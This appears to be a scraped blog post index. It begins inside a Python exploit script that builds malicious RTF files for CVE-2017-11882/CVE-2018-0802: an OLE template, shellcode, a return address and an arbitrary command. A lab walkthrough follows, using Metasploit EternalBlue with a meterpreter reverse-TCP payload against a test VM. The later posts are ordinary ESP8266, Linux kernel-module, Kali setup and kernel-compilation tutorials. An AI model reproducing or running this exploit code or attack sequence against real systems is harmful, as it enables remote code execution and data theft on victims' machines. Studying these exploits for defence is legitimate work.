FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000}{\\result {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 {\\pict{\\*\\picprop\\shplid1025{\\sp{\\sn shapeType}{\\sv 75}}{\\sp{\\sn fFlipH}{\\sv 0}}{\\sp{\\sn fFlipV}{\\sv 0}}{\\sp{\\sn fLockAspectRatio}{\\sv 1}}{\\sp{\\sn pictureGray}{\\sv 0}}{\\sp{\\sn pictureBiLevel}{\\sv 0}}{\\sp{\\sn fRecolorFillAsPicture}{\\sv 0}}{\\sp{\\sn fUseShapeAnchor}{\\sv 0}}{\\sp{\\sn fFilled}{\\sv 0}}{\\sp{\\sn fHitTestFill}{\\sv 1}}{\\sp{\\sn fillShape}{\\sv 1}}{\\sp{\\sn fillUseRect}{\\sv 0}}{\\sp{\\sn fNoFillHitTest}{\\sv 0}}{\\sp{\\sn fLine}{\\sv 0}}{\\sp{\\sn fPreferRelativeResize}{\\sv 1}}{\\sp{\\sn fReallyHidden}{\\sv 0}}{\\sp{\\sn fScriptAnchor}{\\sv 0}}{\\sp{\\sn fFakeMaster}{\\sv 0}}{\\sp{\\sn fCameFromImgDummy}{\\sv 0}}{\\sp{\\sn fLayoutInCell}{\\sv 1}}}\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307{\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\\par}\"\"\"OBJDATA_TEMPLATE = R\"\"\"01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000000003000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b400899b203c1e21066ba120c03c28d5b1c53ffe0202020200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006f006e0020004e00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000004000000c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000d0000004d45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d61746854797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e657720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a600190160a000000313131313131313131310c000000320a6001100f0a000000313131313131313131310c000000320a600190070a000000313131313131313131310c000000320a600110000a000000313131313131313131310a00000026060f000a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff7cef1800040000002d01010004000000f0010000030000000000\"\"\"stage1=\"\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\x31\\xDB\\x53\\x51\\xBE\\x64\\x3E\\x72\\x12\\x31\\xD6\\xFF\\x16\\x53\\x66\\x83\\xEE\\x4C\\xFF\\x10\"stage1=stage1.ljust(44,'\\x90')COMMAND_OFFSET = (0x949+0x2b)*2COMD_LEN = (0x94-0x2b)def create_ole_exec_primitive(command): hex_command = command.encode(\"hex\") hex_command += (COMD_LEN - len(command)) * \"20\" hex_command += \"2500\" objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, \"\\r\\n\") ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):] return OBJECT_HEADER + ole_datadef create_rtf(header, trailer, command): if len(command) &gt; COMD_LEN: print '[!] Command must be shorter than 109 bytes!' sys.exit(0) ole = create_ole_exec_primitive(command + \" #\") payload='\\x1c\\x00\\x00\\x00\\x02\\x00\\x9e\\xc4\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\xa7\\\\\\x00\\xc4\\xee[\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ' payload+=stage1 payload+=pack('&lt;I',0x00402114) # ret payload+='\\x00'*2 payload+=command payload=payload.ljust(197,'\\x00') return header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode('hex') + OBJECT_TRAILER11882 + trailerdef getrheader(file): input_file = open(file,\"r\").read() r_header = input_file.split(\"{\\*\\datastore\")[0] return r_headerif __name__ == '__main__': print LOGO parser = argparse.ArgumentParser(description=\"PoC for CVE-2018-0802 And CVE-2017-11882\") parser.add_argument(\"-c\", \"--command\", help=\"Command run in target system\", required=True) parser.add_argument('-o', \"--output\", help=\"Output exploit rtf\", required=True) parser.add_argument(\"-i\", \"--input\", help=\"Input normal rtf.\", required=False) args = parser.parse_args() if args.input != None: r_header = getrheader(args.input) else: r_header = RTF_HEADER rtf_content = create_rtf(r_header, RTF_TRAILER, args.command) output_file = open(args.output, \"w\") output_file.write(rtf_content) print \"[*] Done ! output file --&gt; \" + args.output","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"},{"name":"信息安全","slug":"信息安全","permalink":"https://czqu.net/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}]},{"title":"使用vscode快速搭建单片机开发环境","slug":"release/2020-06-02-esp8266-vscode-development-environment","date":"2020-06-09T16:00:00.000Z","updated":"2020-06-09T16:00:00.000Z","comments":true,"path":"posts/23513/","permalink":"https://czqu.net/posts/23513/","excerpt":"","text":"摘要：本文主要介绍了如何搭建以Visual Studio Code 和 PlatformIO为基础的单片机开发环境，并以esp8266开发板为例，通过在OLED显示屏上显示文字的一个例子介绍如何开发一个单片机程序。 本文主要使用的环境： 单片机开发板:Esp8266(CH340G) Visual Studio Code：1.45.1 PlatformIO：Core 4.3.4 Home 3.2.2 U8g2：2.28.6 一、硬件部分首先就是去某宝买一个esp8266开发板和显示屏，这里我买的是这个（不贴链接，不然有打广告嫌疑，自己去搜哈，有些卖家不送杜邦线的，可以提前问问） 按照卖家的说明将显示屏和开发板连接好 二、软件部分1. 安装Visual Studio Code 和 PlatformIOvscode: https://code.visualstudio.com/ 安装完成vscode启动，扩展页面下搜索platformio即可找到,选择第一个Platformio IDE，安装即可（这里需要耐心等待一会） 安装完成，等待vscode重新加载后，左下角会多一个小房子图标，点击后即可显示Platformio IDE主界面 2.安装显示库如图点击主界面右侧侧边栏Libraies选项卡，然后直接搜索U8G2然后点击进去，里面有个安装按钮，点一下即可： 3. 开始我们的第一个程序 选择新建工程: ​ 选择板子类型和框架然后点完成，这里我的设置如下图： 然后即可在main.cpp编辑你的代码： 这里我们输入如下代码 12345678910111213141516171819202122232425#include &lt;Arduino.h&gt;#include &lt;U8g2lib.h&gt;#define bmp_x 64#define bmp_y 64#define SSD1306_SDA 5#define SSD1306_SLK 4U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, SSD1306_SLK, SSD1306_SDA);void setup() { u8g2.begin(); u8g2.enableUTF8Print(); // 打开utf-8支持}void loop() { u8g2.setFont(u8g2_font_wqy12_t_gb2312); // 设置字体 u8g2.setFontDirection(0); u8g2.firstPage(); do { u8g2.setCursor(0, 15); u8g2.print(\"中国\"); u8g2.drawUTF8(0,40,\"我爱你\"); } while ( u8g2.nextPage() ); delay(1000);} 代码解释： (1).void setup() 函数里的内容启动时会执行一次以后不再执行，一般用于初始化。void loop()函数里的内容将会在机器通电时循环执行，一般用于干正事。 (2).u8g2.begin()：U8g2的构造函数。可以理解为初始化。 (3).5、6、7行与你的显示屏有关 具体参见： https://blog.csdn.net/weixin_30510153/article/details/96227475https://github.com/olikraus/u8g2/wiki/gallery (4).u8g2.setFontDirection()，用于设置方向 可选参数:0123 (5).u8g2.firstPage()/nextPage()：循环刷新显示，保持这样就好，把你要输出的内容放在这里面就行。 (6).u8g2.setCursor(x, y) 设置打印功能的光标位置，也就是设置你在上绘制图形或文字的起始位置。 (7).delay(1000)会使单片机延迟1000个时钟周期也就是暂停一段时间啥也不干留给显示屏处理数据，设置太短会来不及写到屏幕上。 4.连接板子到电脑，然后编译并刷写到板子上如下图，可以先点编译再点旁边的上传，也可以直接点上传 当你看到下图时，说明刷写成功了，没成功的仔细检查一下设备连线，还有就是看看你的代码，显示屏设置对不对。 三、成果展示刷写成功后，OLED显示屏应该可以成功显示出我们设置的内容了 附其他U8G2库常用函数 1.指令 12345u8g2.clearDisplay(); // 清除显示数据及屏幕u8g2.clearBuffer(); // 清Buffer缓冲区的数据u8g2.sendBuffer(); // 将Buffer帧缓冲区的内容发送到显示器,发送刷新消息u8g2.sendF(\"c\", 0x0a7); // 向显示控制器发送特殊命令u8g2.setPowerSave(0) // 开关省电模式 2.设置 123456789101112131415161718u8g2.enableUTF8Print(); //设置启用UTF-8支持u8g2.disableUTF8Print(); //设置停用UTF-8支持u8g2.setContrast(); //设置显示屏亮度/对比度(0-255)u8g2.setBusClock(); //设置连接速度(IIC:200000-400000/SPI:1000000-8000000),在begin()之前调用//设置字体u8g2.setFontMode(0); //定义字体背景模式,仅u8g2_xxx_tX字体支持,默认0,禁用透明u8g2.setFontDirection(0); //旋转当前显示 参数:0123u8g2.setFont(u8g2_font_unifont_t_chinese1); //设置字体u8g2.setFontPosCenter(); //设置字体基线Center/Baseline/Bottom/Top//设置颜色u8g2.setDrawColor(1); //设置颜色,0透显,1实显,2XOR (drawCircle,drawDisc,drawEllipse和drawFilledEllipse不支持XOR模式)//设置光标位置u8g2.home(); //设置光标回初始位置u8g2.setCursor(x, y); //设置打印功能的光标位置u8g2.setBitmapMode(0); //设置是否开启位图函数背景色 3.简单绘制 1234u8g2.drawStr(x, y, \"文本\"); // 绘制文本字符,不能绘制编码大于或等于256,绘制文本前需定义字体.y轴向上绘制u8g2.drawUTF8(x, y,\"字符\"); // 绘制一个编码为UTF-8的字符串.注意1.编译器支持2.代码编辑器支持u8g2.drawGlyph(x, y, HEX); // 绘制特殊文本图标(需联合特殊字体)u8g2.print(); // 打印文本字符(需要联合光标位置setCursor,setFont)支持变量和F() 4.高级绘制 12345678910111213141516171819u8g2.drawPixel(x, y); // 在xy位置绘制一个像素.u8g2.drawHLine(x, y, w); // 绘制水平线 w长度u8g2.drawVLine(x, y, h); // 绘制垂直线 h高度u8g2.drawLine(x1, y1, x2, y2); // 画自由线 x1y1点1 x2y2点2u8g2.drawBox(x, y, w, h); // 绘制矩形，画填充矩形w,h,宽度,高度 2 u8g2.drawFrame(x, y, w, h); // 画空心矩形w,h,宽度,高度u8g2.drawRFrame(x,y,w,h,r); //绘制圆角矩形，要求w &gt;= 2*(r+1);h &gt;= 2*(r+1);否则未定义2*(r+1)// 正或椭圆u8g2.drawCircle(圆心x, 圆心y, 半径rad, 部分位置U8G2_DRAW_ALL); // 画空心圆 rad半径 直径为 2rad+1u8g2.drawEllipse(圆心x, 圆心y, 椭圆长度x, 椭圆宽度y, 部分位置U8G2_DRAW_ALL) //画空心椭圆 长度和宽度均为整个圆的1/2U8G2_DRAW_ALL /*替换参数:U8G2_DRAW_ALL 全部U8G2_DRAW_UPPER_RIGHT 上右U8G2_DRAW_UPPER_LEFT 上左U8G2_DRAW_LOWER_RIGHT 下右U8G2_DRAW_LOWER_LEFT 下左*/u8g2.drawTriangle(x1,y1,x2,y2,x3,y3); //绘制多边形，三个点的坐标,实心u8g2.drawXBM( x, y, w, h, bits); //绘制位图，bits是位图资源表,setBitmapMode(1)切换为旧模式","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"esp8266","slug":"esp8266","permalink":"https://czqu.net/tags/esp8266/"},{"name":"单片机","slug":"单片机","permalink":"https://czqu.net/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"vscode","slug":"vscode","permalink":"https://czqu.net/tags/vscode/"}],"author":"Ryan"},{"title":"永恒之蓝漏洞的简单利用","slug":"release/2020-06-08-ms17-010-Simple-use","date":"2020-06-09T16:00:00.000Z","updated":"2020-06-09T16:00:00.000Z","comments":true,"path":"posts/29143/","permalink":"https://czqu.net/posts/29143/","excerpt":"","text":"前言： 永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。 详见Microsoft 安全公告：MS17-010 :https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010 恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 本文主要利用“永恒之蓝”漏洞（Microsoft 安全公告：MS17-010）对目标靶机进行攻击并拿到远程执行的权限，并通过获取远程靶机上的文件的例子讲解此漏洞的危害，提高大家的安全意识。 本文为科普性质文章，仅用于学习交流，严禁用于非法用途 实验环境： 靶机： Windows 7 64 位 专业版 ip:192.168.4.6 攻击主机： Kali X64 2020.2 ip:192.168.4.3 1.设置靶机我们在靶机的C盘上放置一个文本文件，保存此文件，内容如下： 2.开始攻击（不想了解攻击过程的可以直接看 3 ）首先扫描一下本网内的有哪些机器可以攻击 1sudo nmap -sS -sV -Pn 192.168.4.0/24 如下图可以发现我们成功扫描到了我们的靶机： 然后终端打开 msfconsole攻击框架 1msfconsole 设置参数： 12345use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.4.3set rhost 192.168.4.6exploit 下图为渗透成功后的界面： 3.入侵这时候我们已经可以在Win7靶机上执行任意命令了，为了简单起见，这里我们执行一个type命令查看一下刚刚上文保存的的文件，可以看到文件内容已经可以获取，而且在靶机上没有任何提示： 4.结语通过“永恒之蓝”漏洞，黑客便可远程攻击拥有任何此漏洞的Windows 机器，无需用户任何操作，只要开机上网（因此不要连接来历不明的WiFi，也许你就刚好暴露在黑客的枪口下），不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 由此可见，任何没有打补丁的机器都将可能陷入危险之中，所以请不要随意关闭Windows 更新。此外还有很多针对手机的攻击，例如针对安卓的Strandhogg漏洞，包括最新Android10在内的所有Android版本，都存在Strandhogg漏洞。不法攻击者可以利用StrandHogg漏洞，使用BankBot银行木马等恶意软件，悄无声息地盗走用户的银行卡内余额。此外它还能访问你的摄像头和麦克风，获取设备的位置，读取短信，访问你的私人照片和视频，访问联系人……只要成功利用Strandhogg漏洞，攻击者可以随意获取上述信息。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"},{"name":"kali","slug":"kali","permalink":"https://czqu.net/tags/kali/"},{"name":"linux","slug":"linux","permalink":"https://czqu.net/tags/linux/"},{"name":"exploit","slug":"exploit","permalink":"https://czqu.net/tags/exploit/"},{"name":"渗透","slug":"渗透","permalink":"https://czqu.net/tags/%E6%B8%97%E9%80%8F/"}],"author":"czqu "},{"title":"编写我的第一个Linux 内核模块“hello_module","slug":"release/2020-06-08-my-first-linux-kernel","date":"2020-06-09T16:00:00.000Z","updated":"2020-06-09T16:00:00.000Z","comments":true,"path":"posts/19043/","permalink":"https://czqu.net/posts/19043/","excerpt":"","text":"前言： Linux 内 核 模 块 全 称 为 “ 动 态 可 加 载 内 核 模 块 (Loadable Kernel Module,LKM)”，是系统内核向外部提供的功能插口。作为宏内核结构，Linux 内核具有效率高的特点，但也有可扩展性和可维护性相对较差的不足，Linux 提供模块机制正是弥补这一缺陷。 模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。模块在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程是不同的。模块通常有一组函数和数据结构组成，用来实现某种文件系统、驱动程序或其它内核上层功能。 本文将介绍如何编写一个简单的内核模块以及如何传递参数给此模块。 一、 编写一个简单的内核模块1.编写模块程序编写如下简单代码，本示例中代码文件命名“hello_module.c”。 123456789101112131415161718192021//hello_module.c#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init hello_init(void){ printk(\"This is hello_module, welcome to Linux kernel \\n\"); return 0;}static void __exit hello_exit(void){ printk(\"see you next time!\\n\");}module_init(hello_init);module_exit(hello_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"Mr Q\");MODULE_DESCRIPTION(\"hello kernel module\");MODULE_ALIAS(\"hello\"); 以上代码解释如下: （1） #include &lt;linux/module.h&gt;：必须。module.h 头文件包含了对模块的结构定义以及模块的版本控制，任何模块程序的编写都要包含这个头文件； （2） #include &lt;linux/kernel.h&gt;：kernel.h 包含了常用的内核函数，如以上程序中的 printk()函数； （3） #include &lt;linux/init.h&gt;：必须。init.h 包含了 module_init()和 module_exit()函数的声明； （4） module_init()：必须。模块加载函数，加载模块式该函数自动执行，进行初始化操作； （5） module_exit()：必须。模块卸载函数，卸载模块时函数自动执行，进行清理操作； （6） MODULE_LICENSE():表示模块代码接受的软件许可协议。Linux 内核是使用 GPL V2 的开源项目，其要求所有使用和修改了 Linux 内核代码的个人或组织都有义务把修改后的源代码公开，这是一个强制的开源协议，所以一般编写驱动代码都需要显示的声明和遵循本协议，否则内核 UI 发出被污染的警告； （7） MODULE_AUTHOR():描述模块的作者信息； （8） MODULE_DESCRIPTION():简单描述模块的用途、功能介绍等； （9） MODULE_ALIAS():为用户控件提供的别名； （10） printk():内核输出函数，默认打印系统文件 “ /var/log/kern.log”的内容。 2. 编译内核模块编写 Makefile 文件，文件名必须为“Makefile” 12345678910obj-m := hello_module.oKERNELBUILD := /lib/modules/$(shell uname -r)/buildCURRENT_PATH := $(shell pwd)all: make -C $(KERNELBUILD) M=$(CURRENT_PATH) modulesclean: make -C $(KERNELBUILD) M=$(CURRENT_PATH) clean 以上代码解释如下: （1） obj-m := &lt;模块名&gt;.o：定义要生成的模块名称 （2） KERNELBUILD := /lib/modules/$(shell uname -r)/build ： KERNELBUILD 为自定义名称，用于指向正在运行 Linux 的内核编译目录，其中“uname -r”标识显示对应的内核版本； （3） CURRENT_PATH := $(shell pwd)：CURRENT_PATH 为自定义名称，用于指向当前当前目录； （4） all:编译执行的动作 （5） clean:zhixing make clean 需要的动作。“make clean”用于清除上次的 make 命令所产生的 object 文件（后缀为“.o”的文件）及可执行文件。 3.编译将以上两个文件(hello_module.c 和 Makefile)保存于同一目录下，将上文中代码存放在路径为“/code/hellomodule/”，编译需在文件保存目录中进行。 编译成功后，可看到生成的 hello_module.ko 目标文件 4.检查编译模块可通过 file 命令检查编译的模块是否正确，可以看到 x86-64 架构的 elf文件，说明编译成功: 也可通过 modinfo 命令进一步检查 : 5.插入模块通过 insmod 命令插入模块，完成插入后可通过 lsmod 命令查看当前模块是否已经被加载到系统中: 系统加载模块后，也会在“/sys/module”目录下新建以模块名命名的目录 : 6.查看输出 因 本 演示 中 prink()采 用 默认 输出 等级 ，可 通 过“ dmesg” 或“ tail /var/log/kern.log”命令查看输出结果。 “ tail /var/log/kern.log”命令查看输出结果： 7. 卸载模块 卸载模块，可通过“rmmod 模块名”实现，通 过“ tail /var/log/kern.log”命令查看输出结果。 二、 模块参数1.说明Linux 内核提供一个宏来实现模块的参数传递 12345#define module_param(name, type, perm) \\module_param_named(name, name, type, perm)#define MODULE_PARM_DESC(_parm, desc) \\_MODULE_INFO(parm, _parm, #_parm \":\" desc); module_param()宏由 3 个参数组成，name 表示参数名，type 表示参数类型，perm 表示参数读写权限。MODULE_PARM_DESC()宏提供参数的简单说明，参数类型可为 byte、short、int、long、char、bool 等类型；perm 指定在 sysfs 中相应文件的访问权限，如设置为 0 则不会出现在 sysfs 文件系统中，设置为 0644 标识 root 用户可修改本参数。 12345static int debug = 1;module_param(debug, int, 0644);MODULE_PARM_DESC(debug, \"enable debugging information\");#define dprintk(args...) if(debug){printk(KERN_DEBUG args);} 如上述实际代码所示（driver/misc/altera-stap1/altera.c），实际定义模块参数 debug,类型是 int,访问权限是 0644。参数用途是大概调试信息，实际内核编程中常用此方法进行内核调试。 2.开始动手修改上文中的“hello_module.c”文件，改为以下内容： 123456789101112131415161718192021222324252627282930313233//hello_module.c#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int debug = 1;module_param(debug, int, 0644);MODULE_PARM_DESC(debug, \"debugging information\");#define dprintk(args...) if(debug){printk(KERN_DEBUG args);}static int myparm = 10;module_param(myparm, int, 0644);MODULE_PARM_DESC(myparm, \"kernel module parameter experiment.\");static int __init parm_init(void){ dprintk(\"my linux kernel module init.\\n\"); dprintk(\"module parameter = %d\\n\", myparm); return 0;}static void __exit parm_exit(void){ printk(\"see you next time!\\n\");}module_init(parm_init);module_exit(parm_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"Mr Q\");MODULE_DESCRIPTION(\"kernel module paramter experiment\");MODULE_ALIAS(\"myparm\"); make编译，装载模块，并查看输出: 通过查看日志信息，可发现输出以上程序中 参数 的默认值。 卸载模块，赋值重新加载模块,修改参数 myparm 值为 116： 1insmod parm_module.ko myparm=116 通过查看日志信息，可发现 参数 值已经改变。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://czqu.net/tags/linux/"},{"name":"kernel","slug":"kernel","permalink":"https://czqu.net/tags/kernel/"},{"name":"c","slug":"c","permalink":"https://czqu.net/tags/c/"}],"author":"Ryan "},{"title":"VMware虚拟机安装kali 2020.2","slug":"release/2020-4-3-install-kali 2020.2","date":"2020-04-03T02:00:00.000Z","updated":"2020-04-03T02:00:00.000Z","comments":true,"path":"posts/55435/","permalink":"https://czqu.net/posts/55435/","excerpt":"","text":"1.打开Kali官网下载镜像,这里直接选择VMware 2.解压然后在VMware中点击”文件-打开”导入虚拟机 3.点编辑设置打开虚拟化选项(没有此选项的点击升级此虚拟机,还没有的就检查BIOS设置) 4.点击开启此虚拟机,用户名和密码在虚拟机描述里有(2020版用户名和密码都是kali) 5.设置kali语言为中文 虚拟机默认语言为英文 设置步骤如下 (1)终端输入代码 1sudo dpkg-reconfigure locales 然后选择字符编码： en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8 （用空格选定） 接着选择字符： zh_CN.UTF-8 选定后回车确认 (2)接着输入如下代码安装字体,如果没有成功看(3) 12sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy (3)换阿里云源 12sudo vim /etc/apt/sources.list 或者图形化: 1sudo mousepad /etc/apt/sources.list 先备份原文并将这一段覆盖原文 123# aliyun deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 更新源 1sudo apt-get update (4)重启后就变为中文了","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"kali","slug":"kali","permalink":"https://czqu.net/tags/kali/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://czqu.net/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"陈子琦"},{"title":"Linux内核的编译","slug":"release/2020-3-3-Compilation-of-the-Linux-kernel","date":"2020-03-03T02:00:00.000Z","updated":"2020-03-03T02:00:00.000Z","comments":true,"path":"posts/2461/","permalink":"https://czqu.net/posts/2461/","excerpt":"","text":"前言： 常见 Linux 内核编译有两种方式，一是直接在 Linux 系统上编译得到二进制文件，并对原有 Linux 内核进行替换，即更换 Linux 内核，此方法可能因新内核有 bug 导致系统奔溃，且难以返回原版本内核而不得不重装；第二种方法则是在模拟器中运行新的 Linux 内核，以避免对系统内核的修改。 BusyBox 是一个集成了三百多个最常用 Linux 命令和工具的软件，因为单独的 Linux 内核无任何用于用户交互的 UI，所以需要通过其它工具与新编译的Linux 内核交互。 QEMU 是以 GPL 许可证分发源码的模拟处理器，可用于模拟常见的硬件平台，常用于在 Linux 系统中建立虚拟机。 本文在阿里云 Ubuntu 18.04 64 位操作系统环境下编译 ARM Linux 内核。过程中主要是用交叉编译工具链 gcc-arm-linux-gnueabi 编译系统源码，并使用 QEMU 软件仿真硬件平台测试对象系统。 **建议使用 root 用户操作 ** 本文所使用的环境： 操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 